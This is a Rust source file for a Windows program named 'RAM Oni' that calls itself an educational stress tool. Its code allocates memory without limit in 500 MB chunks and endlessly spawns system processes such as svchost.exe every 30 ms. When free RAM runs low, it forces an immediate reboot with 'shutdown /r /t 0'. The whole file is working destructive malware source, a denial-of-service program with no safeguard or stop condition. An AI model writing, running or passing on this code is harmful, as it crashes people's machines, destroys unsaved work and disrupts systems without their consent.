#[cfg(windows)]
mod ram_oni {
    use std::ffi::CString;
    use std::process::Command;
    use std::thread;
    use std::time::Duration;
    use winapi::um::sysinfoapi::GlobalMemoryStatusEx;
    use winapi::um::sysinfoapi::MEMORYSTATUSEX;
    use winapi::um::winuser::{MB_OK, MessageBoxA};

    fn get_memory_status() -> Option<u64> {
        unsafe {
            let mut mem_status = MEMORYSTATUSEX {
                dwLength: std::mem::size_of::<MEMORYSTATUSEX>() as u32,
                ..std::mem::zeroed()
            };
            if GlobalMemoryStatusEx(&mut mem_status) != 0 {
                Some(mem_status.ullAvailPhys)
            } else {
                None
            }
        }
    }

    fn restart_windows() {
        let _ = Command::new("shutdown").args(&["/r", "/t", "0"]).spawn();
    }

    pub fn start() {
        unsafe {
            let title = CString::new("RAM Oni").unwrap();
            let message = CString::new("Hello,there this is RAM Oni and this is an educational tool to study system behavior under stress").unwrap();
            MessageBoxA(
                std::ptr::null_mut(),
                message.as_ptr(),
                title.as_ptr(),
                MB_OK,
            );
        }

        thread::spawn(|| {
            let mut hog: Vec<Vec<u8>> = Vec::new();
            loop {
                hog.push(vec![0u8; 500 * 1024 * 1024]);
                println!("🔥 RAM CHUNK Allocated: {} MB", hog.len() * 500);

                if let Some(free_mem) = get_memory_status() {
                    println!("🧠 Free RAM: {:.2} MB", free_mem as f64 / (1024.0 * 1024.0));
                    if free_mem < 200 * 1024 * 1024 {
                        println!("💥 Low RAM detected! Restarting system...");
                        restart_windows();
                        break;
                    }
                }

                thread::sleep(Duration::from_millis(10));
            }
        });

        let heavy_programs = vec![
            "RuntimeBroker.exe",
            "dllhost.exe",
            "SearchIndexer.exe",
            "svchost.exe",
        ];

        loop {
            for prog in &heavy_programs {
                let _ = Command::new(prog).spawn();
            }
            thread::sleep(Duration::from_millis(30));
        }
    }
}

#[cfg(windows)]
fn main() {
    ram_oni::start();
}

#[cfg(not(windows))]
fn main() {
    println!("❌ This tool is for Windows only.");
}
